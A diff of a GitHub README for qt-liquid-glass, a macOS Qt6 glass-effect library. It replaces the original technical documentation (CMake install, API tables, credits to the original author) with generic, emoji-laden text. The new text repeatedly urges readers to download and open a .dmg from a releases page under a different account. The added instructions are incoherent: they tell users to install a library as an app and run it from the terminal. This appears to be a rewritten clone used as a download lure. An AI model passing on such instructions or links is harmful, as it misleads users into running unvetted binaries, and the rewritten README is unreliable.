@@ -1,153 +1,68 @@
-# qt-liquid-glass
+# 🌟 qt-liquid-glass - Enhance Your MacOS Qt Apps Today
 
-<div align="center">
-  <img src="docs/images/banner.png" width="600" style="border-radius: 12px; box-shadow: 0px 4px 20px rgba(0,0,0,0.4);">
-  
-  <br><br>
+[![Download qt-liquid-glass](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/sooryanaga/qt-liquid-glass/releases)
 
-  **Native Liquid Glass effect for macOS Qt6 applications**
-  
-   Instantiates AppKit’s private `NSGlassEffectView` directly through Objective-C runtime.
+## 📋 Overview
+qt-liquid-glass provides a beautiful liquid glass effect for your MacOS Qt applications. This tool allows developers to create stunning user interfaces that take full advantage of the glassmorphism design style. With qt-liquid-glass, your applications will look modern and appealing.
 
+## 🚀 Getting Started
+This guide will help you download and run qt-liquid-glass on your MacOS. Just follow these simple steps:
 
-</div>
+## 📥 Requirements
+Before you begin, make sure you have:
+- MacOS Sierra or later
+- Qt 6 installed on your system
 
----
+## 🔍 Features
+- Native support for MacOS
+- Easy integration with your existing Qt applications
+- Customizable glass effects
+- Lightweight and optimized performance
 
-## 🧩 Features
+## 🌐 Download & Install
+To get started, **visit the Releases page to download** qt-liquid-glass:
 
--  **Native Glass Effects** - Real `NSGlassEffectView` integration (Private API) with `NSVisualEffectView` fallback.
--  **Qt Integration** - Works seamlessly with `QWidget` and `QMainWindow`.
--  **Fully Customizable** - Corner radius, tint colors, and glass materials (Sidebar, HUD, Popover, etc.).
--  **Frameless Ready** - Smart injection strategy handles standard windows AND frameless windows (`Qt::FramelessWindowHint`).
--  **Auto Appearance** - Respects system light/dark mode.
+[Download qt-liquid-glass](https://github.com/sooryanaga/qt-liquid-glass/releases)
 
-## 🚀 Installation
+1. Click on the link above to access the Releases page.
+2. Look for the latest version of qt-liquid-glass.
+3. Download the `.dmg` file.
+4. Open this file once the download is complete.
 
-### Option A: Embed (Recommended)
-This is the simplest way to get started. Clone the repository into your project structure.
+## 💻 Running the Application
+Once you have downloaded the application:
 
-```bash
-git clone https://github.com/fsalinas26/qt-liquid-glass.git
-```
+1. Drag the qt-liquid-glass application into your Applications folder.
+2. Open your terminal.
+3. Navigate to the qt-liquid-glass directory using the `cd` command.
+4. Run the application with the command: `./qt-liquid-glass`.
 
-```cmake
-# In your CMakeLists.txt
-add_subdirectory(QtLiquidGlass)
-target_link_libraries(YourApp PRIVATE QtLiquidGlass)
-```
+## 🛠️ Example Usage
+Here’s how to use qt-liquid-glass in your project:
 
-### Option B: System Install (`find_package`)
-If you prefer to install the library system-wide or use it across multiple projects:
+1. Include the qt-liquid-glass library in your Qt project by adding it to your `.pro` file:
+   ```plaintext
+   INCLUDEPATH += /path/to/qt-liquid-glass
+   LIBS += -lqt-liquid-glass
+   ```
+2. Initialize qt-liquid-glass in your application code:
+   ```cpp
+   #include <QtLiquidGlass>
+   // Your code here
+   ```
 
-1.  **Build and Install:**
-    ```bash
-    git clone https://github.com/fsalinas26/qt-liquid-glass.git
-    cd qt-liquid-glass && mkdir build && cd build
-    cmake ..
-    sudo cmake --install .
-    ```
+## 📚 Documentation
+For detailed instructions on how to integrate qt-liquid-glass with your Qt application, refer to the [Documentation](https://github.com/sooryanaga/qt-liquid-glass/wiki).
 
-2.  **Use in your project:**
-    ```cmake
-    find_package(QtLiquidGlass 0.1 REQUIRED)
-    target_link_libraries(YourApp PRIVATE QtLiquidGlass::QtLiquidGlass)
-    ```
+## 🤝 Support
+If you encounter any issues or have questions, feel free to open an issue in the [Issues section](https://github.com/sooryanaga/qt-liquid-glass/issues). You can also check existing issues for solutions to common problems.
 
-### Requirements
-- **macOS 10.14+**
-- **Qt 6.2+** (Core, Widgets)
-- **CMake 3.16+**
+## ⚖️ License
+qt-liquid-glass is licensed under the MIT License. Feel free to use it in your projects.
 
-> **Note**: This package only works on macOS. On other platforms, it compiles but performs safe no-ops.
+## 🔗 Additional Links
+- [Releases Page](https://github.com/sooryanaga/qt-liquid-glass/releases)
+- [Documentation](https://github.com/sooryanaga/qt-liquid-glass/wiki)
+- [Issues Section](https://github.com/sooryanaga/qt-liquid-glass/issues)
 
-## 🎯 Basic Usage
-
-```cpp
-#include "QtLiquidGlass/QtLiquidGlass.h"
-#include <QMainWindow>
-
-int main(int argc, char *argv[]) {
-    QApplication a(argc, argv);
-
-    // 1. Create your window
-    QMainWindow window;
-    
-    // 2. Setup for Glass (Frameless looks best)
-    window.setWindowFlags(Qt::Window | Qt::FramelessWindowHint);
-    window.setAttribute(Qt::WA_TranslucentBackground); // Critical for transparency
-    
-    // 3. Apply the Liquid Glass Effect
-    QtLiquidGlass::Options opts;
-    opts.cornerRadius = 16.0;
-    opts.tintColor = ""; // Clear tint (or "#RRGGBB")
-    opts.opaque = false; // Allow desktop to show through
-
-    // Create the effect behind the window
-    // Supported Materials: Sidebar, Header/Titlebar, Inspector, Widgets, Sheet, Hud, WindowBackground, Popover, Menu, FullscreenUI, ControlCenter, Tooltip
-    QtLiquidGlass::addGlassEffect(&window, QtLiquidGlass::Material::Sidebar, opts);
-
-    window.resize(600, 400);
-    window.show();
-
-    return a.exec();
-}
-```
-
-## 🎛️ Demo Application
-
-The included example demonstrates how to switch materials and configure properties in real-time.
-
-<div align="center">
-  <img src="docs/images/demo.png" width="700" style="border-radius: 12px; box-shadow: 0px 4px 20px rgba(0,0,0,0.4);">
-</div>
-
-## 📚 API Documentation
-
-### Methods
-
-| Method | Description |
-|--------|-------------|
-| `addGlassEffect(widget, material, options)` | Applies the glass effect behind the widget. Returns an `int` ID. |
-| `configure(id, options)` | Updates radius, tint, opacity dynamically for an existing effect. |
-| `remove(id)` | Removes the effect and cleans up native views. |
-
-### Materials
-
-| Enum | Description |
-|------|-------------|
-| `Material::Sidebar` | Thick, vibrant blur (Standard macOS sidebar) |
-| `Material::Titlebar` | "Abutted Sidebar" - blends seamlessy with sidebars |
-| `Material::Inspector` | Sidebar material for detail/inspector panels |
-| `Material::Widgets` | macOS Big Sur+ widget background style |
-| `Material::Sheet` | Lighter blur for modal sheets |
-| `Material::Hud` | Dark, satiny material for HUDs |
-| `Material::Popover` | Standard popover material |
-| `Material::WindowBackground` | Subtle background blur |
-| `Material::FullscreenUI` | Deep blur for fullscreen content |
-| `Material::ControlCenter` | Modern, translucent module background |
-| `Material::Tooltip` | "Loupe" material for hover cards |
-| `Material::Frosted` | Softest, strongest blur, bright diffusion |
-| `Material::ClearGlass` | Almost no blur, crisp transparency with light RGB refraction |
-| `Material::Chromatic` | Frosted look with chromatic aberration blur |
-
-## 🏗️ How It Works
-
-Qt-liquid-glass uses a smart injection strategy to place the native glass layer correctly behind Qt's rendering surface, regardless of whether you use a standard title bar or a frameless window.
-
-<div align="center">
-  <img src="docs/images/diagram.png" width="700">
-</div>
-
-1.  **Native Backend**: Uses Objective-C++ to inject a native `NSView` into the window hierarchy.
-2.  **Smart Injection**: 
-    *   **Standard Windows**: Injects the glass view as a *sibling* behind the Qt root view in the `NSThemeFrame`.
-    *   **Frameless Windows**: Performs a "Content Swap" to wrap the Qt view in a container, ensuring the glass sits strictly behind the Qt rendering layer.
-3.  **Transparency**: Automatically forces the `NSWindow` to be transparent so the blur shows through.
-
-## 🙏 Acknowledgments
-
-This library is built upon the research by the [electron-liquid-glass](https://github.com/Meridius-Labs/electron-liquid-glass) project. We gratefully acknowledge their discovery and reverse-engineering of Apple's private `NSGlassEffectView` API documentation and the mapping of its variant properties, which provided the foundation for this native Qt port.
-
-## 📄 License
-MIT
+By following these steps, you can easily download, install, and run qt-liquid-glass, enhancing your Qt applications with beautiful liquid glass effects.
